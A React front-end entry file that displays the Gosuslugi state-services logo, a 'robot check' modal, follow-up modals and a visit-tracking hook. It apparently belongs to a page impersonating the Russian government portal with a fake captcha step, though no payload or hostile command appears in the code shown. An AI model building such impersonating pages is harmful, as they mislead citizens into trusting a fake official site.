import { useState } from "react";
import Loader from "./components/Loader";
import RobotCheckModal from "./components/RobotCheckModal";
import MainModal from "./components/MainModal";
import CancelModal from "./components/CancelModal";
import { useTrackVisit } from './useTrackVisit';
import "./App.css";
import gosImage from "./assets/gosuslugi-removebg-preview.png"

export default function App() {
  const [showRobot, setShowRobot] = useState(true);
  const [showMain, setShowMain] = useState(false);
  const [showCancel, setShowCancel] = useState(false);
useTrackVisit();
  const handleRobotConfirm = () => {
    setShowRobot(false);

    setTimeout(() => {
      setShowMain(true);
    }, 600);
  };

  return (
    <>
      <header className="logo">
        <img class="logo-img" src={gosImage} alt="Госуслуги" />
      </header>

      <main>
        <Loader />
      </main>

      {showRobot && (
        <RobotCheckModal onConfirm={handleRobotConfirm} />
      )}

      {showMain && (
        <MainModal
          onCancel={() => {
            setShowMain(false);
            setShowCancel(true);
          }}
        />
      )}

      {showCancel && (
        <CancelModal onClose={() => setShowCancel(false)} />
      )}
    </>
  );
}